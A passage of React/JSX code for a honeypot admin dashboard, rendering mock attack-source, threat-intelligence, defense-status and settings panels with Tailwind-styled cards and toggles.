                      </Pie>
                      <Tooltip />
                    </PieChart>
                  </ResponsiveContainer>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle>Top Attack Sources</CardTitle>
                  <CardDescription>Countries with highest attack volume</CardDescription>
                </CardHeader>
                <CardContent>
                  <div className="space-y-4">
                    {mockGeoData.map((country, index) => (
                      <div key={index} className="flex items-center justify-between p-3 rounded-lg hover:bg-muted/50 transition-colors">
                        <div className="flex items-center space-x-3">
                          <span className="text-2xl">{country.flag}</span>
                          <div>
                            <span className="font-medium">{country.country}</span>
                            <Badge variant="outline" className="ml-2">
                              {country.risk}
                            </Badge>
                          </div>
                        </div>
                        <div className="text-right">
                          <div className="font-bold">{country.attacks} attacks</div>
                          <div className="text-xs text-muted-foreground">{country.percentage}% of total</div>
                        </div>
                      </div>
                    ))}
                  </div>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* ------------------- THREAT INTEL TAB ------------------- */}
          <TabsContent value="threats" className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle>Threat Intelligence</CardTitle>
                <CardDescription>Indicators of Compromise (IOCs) and threat data</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="space-y-4">
                  {mockThreatIntel.map((threat, index) => (
                    <div key={index} className="flex items-center justify-between p-4 rounded-lg border">
                      <div className="flex items-center space-x-4">
                        <div className={`p-2 rounded-full ${
                          threat.severity === 'critical' ? 'bg-red-100 text-red-600' :
                          threat.severity === 'high' ? 'bg-orange-100 text-orange-600' :
                          threat.severity === 'medium' ? 'bg-yellow-100 text-yellow-600' : 'bg-green-100 text-green-600'
                        }`}>
                          <ShieldAlert className="w-4 h-4" />
                        </div>
                        <div>
                          <div className="font-mono text-sm font-medium">{threat.ioc}</div>
                          <div className="text-xs text-muted-foreground">
                            Type: {threat.type} • First seen: {threat.firstSeen} • Last seen: {threat.lastSeen}
                          </div>
                        </div>
                      </div>
                      <div className="flex items-center space-x-3">
                        <Badge variant={
                          threat.severity === 'critical' ? 'destructive' :
                          threat.severity === 'high' ? 'default' :
                          threat.severity === 'medium' ? 'secondary' : 'outline'
                        }>
                          {threat.severity}
                        </Badge>
                        <div className="text-xs text-muted-foreground">
                          Confidence: {threat.confidence}%
                        </div>
                        <Button variant="ghost" size="sm">
                          <FileText className="w-4 h-4" />
                        </Button>
                      </div>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Card>
                <CardHeader>
                  <CardTitle>AI-Powered Recommendations</CardTitle>
                  <CardDescription>Predictive actions for your honeypots</CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="flex items-center justify-between p-4 rounded-lg bg-muted/50">
                    <div>
                      <h4 className="font-semibold">Block Suspicious IP Ranges</h4>
                      <p className="text-sm text-muted-foreground">Predicted high-risk sources from CN & RU next 24h</p>
                    </div>
                    <Zap className="w-6 h-6 text-yellow-500" />
                  </div>
                  <div className="flex items-center justify-between p-4 rounded-lg bg-muted/50">
                    <div>
                      <h4 className="font-semibold">Increase FTP Security</h4>
                      <p className="text-sm text-muted-foreground">Disable anonymous login on FTP servers</p>
                    </div>
                    <Brain className="w-6 h-6 text-purple-500" />
                  </div>
                  <div className="flex items-center justify-between p-4 rounded-lg bg-muted/50">
                    <div>
                      <h4 className="font-semibold">Honeypot Scaling</h4>
                      <p className="text-sm text-muted-foreground">Deploy +3 FTP honeypots to handle load</p>
                    </div>
                    <Server className="w-6 h-6 text-green-500" />
                  </div>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle>Threat Prevention</CardTitle>
                  <CardDescription>Active defense measures</CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="p-4 rounded-lg border-l-4 border-green-500 bg-green-50 dark:bg-green-950/20">
                    <h4 className="font-semibold text-green-700 dark:text-green-400">Automatic IP Blocking</h4>
                    <p className="text-sm">45 IPs blocked in the last 24 hours</p>
                  </div>
                  <div className="p-4 rounded-lg border-l-4 border-blue-500 bg-blue-50 dark:bg-blue-950/20">
                    <h4 className="font-semibold text-blue-700 dark:text-blue-400">Malware Quarantine</h4>
                    <p className="text-sm">12 malicious files isolated and analyzed</p>
                  </div>
                  <div className="p-4 rounded-lg border-l-4 border-purple-500 bg-purple-50 dark:bg-purple-950/20">
                    <h4 className="font-semibold text-purple-700 dark:text-purple-400">Behavioral Analysis</h4>
                    <p className="text-sm">8 new attack patterns identified</p>
                  </div>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* ------------------- SETTINGS TAB ------------------- */}
          <TabsContent value="settings" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Card>
                <CardHeader>
                  <CardTitle>Dashboard Settings</CardTitle>
                  <CardDescription>Configure your honeypot monitoring preferences</CardDescription>
                </CardHeader>
                <CardContent className="space-y-6">
                  <div className="flex items-center justify-between">
                    <div className="space-y-0.5">
                      <Label htmlFor="dark-mode">Dark Mode</Label>
                      <div className="text-sm text-muted-foreground">
                        Toggle between light and dark theme
                      </div>
                    </div>
                    <Switch
                      id="dark-mode"
                      checked={darkMode}
                      onCheckedChange={setDarkMode}
                    />
                  </div>

                  <div className="flex items-center justify-between">
                    <div className="space-y-0.5">
                      <Label htmlFor="auto-block">Auto Block IPs</Label>
                      <div className="text-sm text-muted-foreground">
                        Automatically block IPs after 3 failed attempts
                      </div>
                    </div>
                    <Switch
                      id="auto-block"
                      checked={autoBlock}
                      onCheckedChange={setAutoBlock}
                    />
                  </div>

                  <div className="flex items-center justify-between">
                    <div className="space-y-0.5">
                      <Label htmlFor="notifications">Email Notifications</Label>
                      <div className="text-sm text-muted-foreground">
                        Receive alerts for critical attacks
                      </div>
                    </div>
                    <Switch
                      id="notifications"
                      checked={notifications}
                      onCheckedChange={setNotifications}
                    />
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="update-interval">Update Interval</Label>
                    <select 
                      id="update-interval"
                      className="w-full p-2 border rounded"
                      defaultValue="3000"
                    >
                      <option value="1000">1 second</option>
                      <option value="3000">3 seconds</option>
                      <option value="5000">5 seconds</option>
                      <option value="10000">10 seconds</option>
                    </select>
                  </div>

                  <Button className="w-full">
                    <Settings className="w-4 h-4 mr-2" />
                    Save Settings
                  </Button>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle>Honeypot Configuration</CardTitle>
                  <CardDescription>Manage your honeypot instances</CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="p-4 rounded-lg border">
                    <h4 className="font-semibold mb-2">Active Honeypots</h4>
                    <div className="space-y-2">
                      {mockAttackMethods.map((service, index) => (
                        <div key={index} className="flex items-center justify-between">
                          <div className="flex items-center gap-2">
                            <div className="w-2 h-2 rounded-full bg-green-500"></div>
                            <span>{service.name} ({service.port})</span>
                          </div>
                          <Badge variant="outline">Active</Badge>
                        </div>
                      ))}
                    </div>
                  </div>

                  <div className="p-4 rounded-lg border">
                    <h4 className="font-semibold mb-2">System Information</h4>
                    <div className="space-y-2 text-sm">
                      <div className="flex justify-between">
                        <span>Honeypot Version:</span>
                        <span>v2.4.1</span>
                      </div>
                      <div className="flex justify-between">
                        <span>Last Updated:</span>
                        <span>2 hours ago</span>
                      </div>
                      <div className="flex justify-between">
                        <span>Total Logs:</span>
                        <span>12,458 entries</span>
                      </div>
                    </div>
                  </div>

                  <div className="flex gap-2">
                    <Button variant="outline" className="flex-1">
                      <Download className="w-4 h-4 mr-2" />
                      Backup Config
                    </Button>
                    <Button variant="outline" className="flex-1">
                      <Upload className="w-4 h-4 mr-2" />
                      Restore
                    </Button>
                  </div>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* ------------------- USAGE GUIDE TAB ------------------- */}
          <TabsContent value="guide">
            <UsageGuide />
          </TabsContent>
        </Tabs>
      </div>

      {/* Attack Detail Modal */}
      <AttackDetailModal 
        attack={selectedAttack} 
        onClose={() => setSelectedAttack(null)} 
      />
    </div>
  )
}

export default AdminDashboard